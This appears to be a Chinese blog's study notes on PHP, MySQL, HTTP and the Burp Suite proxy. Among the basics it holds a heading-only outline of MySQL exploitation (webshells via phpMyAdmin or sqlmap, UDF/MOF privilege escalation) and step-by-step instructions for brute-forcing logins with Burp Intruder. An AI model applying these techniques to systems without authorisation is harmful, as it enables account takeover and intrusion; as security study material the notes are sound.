开发者最好使用可以表达元素语义目的的名称。&lt;img&gt;src属性是必须的，它包含了你想嵌入的图片的路径。 绝对 URL - 链接到托管在其他网站上的外部图像。 相对 URL - 链接到托管在网站内部的图像。 href 属性规定链接指向的页面的 URL。 PHP语法 变量 规则： 变量以 $ 符号开始 变量名必须以字母或者下划线字符开始 变量名不能包含空格 变量名是区分大小写的 PHP NULL 值 NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。 NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。 可以通过设置变量值为 NULL 来清空变量数据 PHP 资源类型 PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。 常见资源数据类型有打开文件、数据库连接、图形画布区域等。 由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。 PHP 类型比较 虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。 松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。 严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。 PHP常量设置 PHP 常量 设置常量，使用 define() 函数。 bool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] ) 该函数有三个参数: name：必选参数，常量名称，即标志符。 value：必选参数，常量的值。 case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的 预定义常量 PHP 提供了一些预定义常量，可以在脚本中直接使用。这些常量通常用于获取 PHP 的配置信息、版本信息等。常见的预定义常量有： PHP_VERSION：当前 PHP 解析器的版本。 PHP_OS：服务器的操作系统。 PHP_INT_MAX：最大的整数值。 E_ERROR、E_WARNING、E_PARSE 等：错误报告级别。 PHP字符串变量 PHP 中的字符串变量 字符串变量用于包含有字符的值。 在创建字符串之后，我们就可以对它进行操作了。可以直接在函数中使用字符串，或者把它存储在变量中。 PHP 并置运算符 在 PHP 中，只有一个字符串运算符。 并置运算符 (.) 用于把两个字符串值连接起来。 PHP strlen() 函数 有时知道字符串值的长度是很有用的。 strlen() 函数返回字符串的长度（字节数）。 PHP strpos() 函数 strpos() 函数用于在字符串内查找一个字符或一段指定的文本。 如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。 三元运算符 (expr1) ? (expr2) : (expr3) 对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。 组合比较符(PHP7+) PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 &lt;&#x3D;&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。 $c &#x3D; $a &lt;&#x3D;&gt; $b; 解析如下： 如果 $a &gt; $b, 则 $c 的值为 1。 如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。 如果 $a &lt; $b, 则 $c 的值为 -1。 括号的使用 我们通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。 PHP条件语句if 语句 - 在条件成立时执行代码if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块switch 语句 - 在若干条件之一成立时执行一个代码块PHP Switch 语句 expression 是要被比较的表达式。 case value: 是可能的值，如果 expression 的值等于某个 case 的值，就执行相应的代码块。 break; 用于终止 switch 语句，防止继续执行下一个 case。 default: 是可选的，用于指定当没有匹配的 case 时执行的代码块。 PHP数组 在 PHP 中创建数组 array() 函数 在 PHP 中，有三种类型的数组： 数值数组 - 带有数字 ID 键的数组 关联数组 - 带有指定的键的数组，每个键关联一个值 多维数组 - 包含一个或多个数组的数组 PHP 数值数组 有两种创建数值数组的方法： 自动分配 ID 键（ID 键总是从 0 开始）： $cars&#x3D;array(“Volvo”,”BMW”,”Toyota”); 人工分配 ID 键： $cars[0]&#x3D;”Volvo”; $cars[1]&#x3D;”BMW”; $cars[2]&#x3D;”Toyota”; 获取数组的长度 - count() 函数 count() 函数用于返回数组的长度（元素的数量） 遍历数值数组 遍历并打印数值数组中的所有值，可以使用 for 循环 PHP 关联数组 关联数组是使用您分配给数组的指定的键的数组。 有两种创建关联数组的方法： $age&#x3D;array(“Peter”&#x3D;&gt;”35”,”Ben”&#x3D;&gt;”37”,”Joe”&#x3D;&gt;”43”); or: $age[‘Peter’]&#x3D;”35”; $age[‘Ben’]&#x3D;”37”; $age[‘Joe’]&#x3D;”43”; 随后可以在脚本中使用指定的键 遍历关联数组 遍历并打印关联数组中的所有值，可以使用 foreach 循环 PHP 数组排序 数组中的元素可以按字母或数字顺序进行降序或升序排列。 PHP - 数组排序函数 sort() - 对数组进行升序排列 rsort() - 对数组进行降序排列 asort() - 根据数组的值，对数组进行升序排列 ksort() - 根据数组的键，对数组进行升序排列 arsort() - 根据数组的值，对数组进行降序排列 krsort() - 根据数组的键，对数组进行降序排列 PHP 超级全局变量 PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。 PHP $GLOBALS $GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 PHP $_SERVER $_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。 PHP $_REQUEST PHP $_REQUEST 用于收集HTML表单提交的数据。 PHP $_POST PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”。 PHP $_GET PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”。 $GET 也可以收集URL中发送的数据。 PHP 表单和用户输入 PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入。 php判断字符串中是否包含指定字符串 strpos $a &#x3D; ‘How are you?’; if (strpos($a, ‘are’) !&#x3D;&#x3D; false) { echo ‘true’; } else { echo ‘false’; } 注意这里一定要使用 !&#x3D;&#x3D; false 来做判断条件语句， strpos() 如果没有找到字符串则返回 FALSE PHP文件处理打开文件 fopen() 函数用于在 PHP 中打开文件。 此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：$file&#x3D;fopen(“welcome.txt”,”r”); 关闭文件 fclose() 函数用于关闭打开的文件： fclose($file); 检测文件末尾（EOF） feof() 函数检测是否已到达文件末尾（EOF）。 在循环遍历未知长度的数据时，feof() 函数很有用。 注释：在 w 、a 和 x 模式下，您无法读取打开的文件！ if (feof($file)) echo “文件结尾”; 逐行读取文件 fgets() 函数用于从文件中逐行读取文件。 注释：在调用该函数之后，文件指针会移动到下一行。 while(!feof($file)) { echo fgets($file). ““; } 逐字符读取文件 fgetc() 函数用于从文件中逐字符地读取文件。 注释：在调用该函数之后，文件指针会移动到下一个字符。 while (!feof($file)) { echo fgetc($file); } PHP 文件上传 创建一个文件上传表单 &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/form&gt; &lt;form&gt; 标签的 enctype 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 &quot;multipart/form-data&quot;。 &lt;input&gt; 标签的 type=&quot;file&quot; 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。 PHP Cookie cookie 常用于识别用户。 如何创建 Cookie？ setcookie() 函数用于设置 cookie。 注释：setcookie() 函数必须位于 标签之前。 语法 setcookie(name, value, expire, path, domain); 如何取回 Cookie 的值？ PHP 的 $_COOKIE 变量用于取回 cookie 的值。 echo $_COOKIE[“user”]; 使用 isset() 函数来确认是否已设置了 cookie 如何删除 Cookie？ 当删除 cookie 时，您应当使过期日期变更为过去的时间点。 setcookie(“user”, “”, time()-3600); PHP Session PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 开始 PHP Session 存储 Session 变量 PHP $_SESSION 变量 $_SESSION[‘views’]&#x3D;1; 销毁 Session unset() 函数用于释放指定的 session 变量： unset($_SESSION[‘views’]); session_destroy() 函数彻底销毁 session PHP 连接 MySQL 先连接到数据库服务器 MySQLi - 面向对象 &#x2F;&#x2F; 创建连接 $conn &#x3D; new mysqli($servername, $username, $password); &#x2F;&#x2F; 检测连接 if ($conn-&gt;connect_error) { die(“连接失败: “ . $conn-&gt;connect_error); } echo “连接成功”; MySQLi - 面向过程 &#x2F;&#x2F; 创建连接 $conn &#x3D; mysqli_connect($servername, $username, $password); &#x2F;&#x2F; 检测连接 if (!$conn) { die(“Connection failed: “ . mysqli_connect_error()); } echo “连接成功”; PHP MySQL 创建数据库 CREATE DATABASE 语句 &#x2F;&#x2F; 创建数据库 $sql &#x3D; “CREATE DATABASE myDB”; if ($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE) { echo “数据库创建成功”; } else { echo “Error creating database: “ . $conn-&gt;error; }&#96; MySQL 是最流行的关系型数据库管理系统，关联数据库将数据保存在不同的表中。SQL语句的分类 1.DQL：数据查询语言（凡是带有select关键字的都是查询语句） 简单查询 1.1查询一个字段 select 字段名 from 表名； 注意： select和from都是关键字。 字段名和表名都是标识符。 所有的SQL语句都以”;”结尾。 2.DML：数据操作语言（凡是对表单中的数据进行增删改的都是DML） insert delete update insert 增 delete 删 update 改 3.DDL：数据定义语言（凡是带有create、drop、alter的都是DDL） DDL主要操作的是表的结构。 create：新建，等同于增 drop：删除 alter：修改 表的创建 建表的语法格式：（建表属于DDL语句） create table 表名（ 字段名1 数据类型, 字段名2 数据类型 ）; 表名：建议以t_或者tbl_开始。 表名和字段名都属于标识符。 MySQL中的数据类型 varchar：可变长度的字符串 会根据实际的数据长度动态分配空间。 char：定长字符串 int：数字中的整数型 插入数据insert（DML） 语法格式： insert into 表名（字段名1,字段名2…) values(值1，值2)； 注意：字段名和值要一一对应。 数量、数据类型要对应。 修改update（DML） 语法格式： update 表名 set 字段名1&#x3D;值1,字段名2&#x3D;值2… where 条件; 注释语法1.从一个 # 到行末。2.从两个连续横杠 – 序列到行尾。 在MySQL中， - （两个连续横杠 ）注释样式要求第二个破折号后跟至少一个空格或控制字符（例如空格，制表符，换行符等）。3.从一个 &#x2F;* 顺序到下一个* &#x2F;结束。 查询逻辑1、连接器：负责跟客户端建立连接、获取权限、维持和管理连接。先连接到数据库上。2、查询缓存拿到一个查询请求，先到查询缓存看看。3、分析器没有命中查询缓存，开始执行语句。分析器开始词法分析和语法分析。4、优化器优化器在表里面有多个索引，决定使用哪个索引，或者多表关联的时候，决定各个表的连接顺序。5、执行器遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。 MySQL漏洞利用1.密码获取1.1暴力破解1.2源代码泄露1.3文件包含1.4其他情况 2.获取webshell2.1phpmyadminroot账号获取webshell2.2sqlmap注入点获取webshell 3.提权3.1mof提权3.2Msf直接mof提权3.3UDF提权 局部和全局作用域在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。 在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。 PHP global 关键字global 关键字用于函数内访问全局变量。 在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字。 Static 作用域当一个函数完成时，它的所有变量通常都会被删除。当您希望某个局部变量不要被删除。 应在您第一次声明变量时使用 static 关键字。 参数作用域参数是通过调用代码将值传递给函数的局部变量。 参数是在参数列表中声明的，作为函数声明的一部分。 PHP echo 和 print 语句echo 和 print 区别:echo - 可以输出一个或多个字符串print - 只允许输出一个字符串，返回值总为 1提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。 PHP EOF(heredoc) 使用说明PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。 使用概述： 1.必须后接分号，否则编译通不过。 2.EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。3.结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。4.开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。 5,.内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。","categories":[],"tags":[]},{"title":"Burpsuite","slug":"a","date":"2024-09-07T15:09:27.000Z","updated":"2024-10-15T15:15:19.462Z","comments":true,"path":"2024/09/07/a/","permalink":"https://xdzjldy.github.io/2024/09/07/a/","excerpt":"","text":"Burpsuite1.Proxy：用于拦截和修改HTTP请求和响应，并允许用户在发送到目标服务器之前手动修改请求内容。 1.1.Intercept:允许用户拦截应用程序的HTTP和HTTPS请求，查看和修改请求，然后转发到目标服务器。使用Intercept，用户可以深入分析应用程序的请求和响应，并查找潜在的漏洞。Intercept还可以帮助用户快速验证漏洞的利用。 在浏览器上安装Proxy SwitchyOmega,进行快速代理。 须将浏览器的流量包转移到burpsuit上，burpsuit再进行发包。 1.2.HTTP history:记录了所有被拦截的请求和响应，使用户能够查看和分析以前的请求和响应。用户可以使用过滤器来搜索特定请求和响应，以便更轻松地查找和分析流量。 2.Target：用于设置测试目标，并让Burp Suite扫描目标应用程序以发现漏洞。 3.Dashboard:用于执行自动化漏洞扫描，包括SQL注入、跨站脚本等多种漏洞。 4.Repeater:用于显示请求和响应的详细信息，包括HTTP头和正文。 5.Intruder:用于发送请求的多个副本，以测试目标服务器的响应是否相同。 1.设置代理：开启浏览器代理，配置burp代理ip，注意要与浏览器代理ip一致（建议使用8080端口） 2.抓包:切换到Proxy菜单，拦截开关开启（intercept is on），点击open browser打开浏览器 3.send to Intruder(Ctrl+I) ​ Positions: 对需要处理的参数（账号，密码）做变量处理(一个参数做变量，选择Sniper;两个以上，选择Cluser Bomb) ​ 点击需要操作变量的参数，点击add按钮 ​ Payloads：载入密码文本 4.Start attack 5.查看结果：扫描完成后，Intruder会显示每个尝试的响应，包括成功登录和失败的情况。通过分析响应，可以判断哪些密码尝试有效。 HTTPHTTP是一种用作获取诸如 HTML 文档这类资源的协议。它是 Web 上进行任何数据交换的基础，同时，也是一种客户端—服务器（client-server）协议，也就是说，请求是由接受方，通常是 Web 浏览器发起的。 URLURL（统一资源定位符）是因特网中的唯一资源的地址。它是浏览器用于检索已发布资源（例如 HTML 页面、CSS 文档、图像等）的关键机制之一。HTTP请求包结构1.起始行：用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。2.一个可选的 HTTP 标头集合指明请求或描述消息主体（body）。3.一个空行指示所有关于请求的元数据已经发送完毕。4.一个可选的包含请求相关数据的主体（比如 HTML 表单内容），或者响应相关的文档。主体的大小有起始行的 HTTP 头来指定。请求头列表1.User-Agent：标识客户端使用的浏览器和操作系统信息。Accept: text&#x2F;plain, text&#x2F;html可以通过$_SERVER[‘HTTP_USER_AGENT’]获取。2.Accept：指定客户端能够处理的内容类型，即可接受的媒体类型。可以通过$_SERVER[‘HTTP_ACCEPT’]获取。3.Accept-Charset：浏览器可以接受的字符编码集Accept-Charset: iso-8859-54.Accept-Encoding：指定浏览器可以支持的web服务器返回内容压缩编码类型Accept-Encoding: compress, gzip5.Accept-Language：浏览器可接受的语言Accept-Language: en,z6.Accept-Ranges：可以请求网页实体的一个或者多个子范围字段Accept-Ranges: bytes7.Content-Type：指定请求体中的数据格式类型。常见的取值有application&#x2F;json、application&#x2F;x-www-form-urlencoded等。可以通过$_SERVER[‘CONTENT_TYPE’]获取。8.Date：请求发送的日期和时间。9.Authorization：用于进行身份验证的凭证信息。常见的取值有Bearer Token、Basic Authentication等。可以通过$_SERVER[‘HTTP_AUTHORIZATION’]获取。10.Cookie：包含来自客户端的Cookie信息。HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。Cookie: role&#x3D;admin;ssid&#x3D;1可以通过$_SERVER[‘HTTP_COOKIE’]获取。11.Referer：指示当前请求是从哪个URL页面发起的。可以通过$_SERVER[‘HTTP_REFERER’]获取。12.Host：指定服务器的域名或IP地址。可以通过$_SERVER[‘HTTP_HOST’]获取。13.X-Requested-With：指示请求是否由Ajax发起的。通常在Ajax请求中会设置该头部字段，取值为”XMLHttpRequest”。可以通过$_SERVER[‘HTTP_X_REQUESTED_WITH’]获取。14.Content-Length：指定请求体的长度。Content-Length: 348可以通过$_SERVER[‘CONTENT_LENGTH’]获取。15.Cache-Control：控制缓存行为的指令。用于指定客户端和代理服务器如何缓存响应Cache-Control: no-cache可以通过$_SERVER[‘HTTP_CACHE_CONTROL’]获取16.X-Forwarded-For（XFF）：是一个事实上的用于标识通过代理服务器连接到 web 服务器的客户端的原始 IP 地址的标头17.Connection：表示是否需要持久连接 &#x2F;&#x2F; HTTP 1.1默认进行持久连接Connection: close18.Expect：请求的特定的服务器行为19.From：发出请求的用户的EmailGET与POST的区别GET 请求主要用于从服务器获取数据。 参数和 URL之间用问号?隔开, 参数键值用等号=连接,然后参数之间用连接符&amp;拼接起来 数据包格式：1.GET 请求数据包格式： 请求行：GET /path/to/resource?param1=value1&amp;m2=value2 HTTP/1.1 请求参数：参数会附加在 URL 后面，形如?param1=value1&amp;m2=value2 2.POST 请求数据包格式：请求行：POST /path/to/resource HTTP/1.1 请求头（Headers）：包含一些元数据信息，如 Content-Type（内容类型）、Content-Length（内容长度）等。 请求体（Body）：放置实际提交的数据，不同的 Content-Type 决定了数据的格式，可以是表单数据、JSON、XML 等。 多次发送相同的 GET 请求会产生相同的结果，不会对服务器状态产生影响。这使得 GET 请求适合用于获取静态资源，如网页、图片、文件等。POST 请求主要用于向服务器提交数据，通常用于创建、更新或删除资源。它将请求的参数作为请求体的一部分发送到服务器。POST 请求是非幂等的，即多次发送相同的 POST 请求可能会产生不同的结果，因为它可能会改变服务器的状态。GET 和 POST 请求的存在是为了满足不同的需求。GET 请求适用于获取数据，而 POST 请求适用于提交数据并对服务器状态进行更改。选择正确的请求方法取决于请求的性质和预期的服务器操作。 GET比POST更不安全，因为GET参数会直接暴露在url上。所以不能用来传递敏感信息get 请求的参数传递方式在 HTTP 请求中，GET 请求可以通过 URL 参数或者请求体的方式传递参数。 1.URL 参数：GET 请求可以通过 URL 中指定的 key-value 形式传递参数。2.请求体（仅适用于 POST、PUT、PATCH 请求）：当 POST、PUT 或 PATCH 请求的 URL 中没有指定参数时，参数会被放置在请求体中。请求体中的数据可以是表单数据、JSON 数据等。例如，使用 POST 请求将 JSON 数据发送到如下 URL 时，请求体中的 JSON 数据如下：{ “name”: “John Doe”, “email”: “&#106;&#x6f;&#x68;&#110;&#46;&#100;&#x6f;&#x65;&#64;&#x65;&#120;&#97;&#109;&#112;&#108;&#x65;&#x2e;&#99;&#111;&#109;“} HTTP1.请求报文格式 2.响应报文格式 method HTTP动词常见方法：HEAD &#x2F; GET &#x2F; POST &#x2F; PUT &#x2F; DELETE &#x2F; PATCH &#x2F; OPTIONS &#x2F; TRACE扩展方法：LOCK &#x2F; MKCOL &#x2F; COPY &#x2F; MOVEversion报文使用的HTTP版本格式为HTTP&#x2F;.HTTP状态返回代码 1xx（临时响应）表示临时响应并需要请求者继续执行操作的状态代码。100 继续 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分101 切换协议 请求者已要求服务器切换协议，服务器已确认并准备切换 HTTP状态返回代码 2xx （成功）表示成功处理了请求的状态代码。HTTP状态返回代码 3xx （重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。HTTP状态返回代码 4xx（请求错误）HTTP状态返回代码 5xx（服务器错误）","categories":[],"tags":[]}],"categories":[],"tags":[]}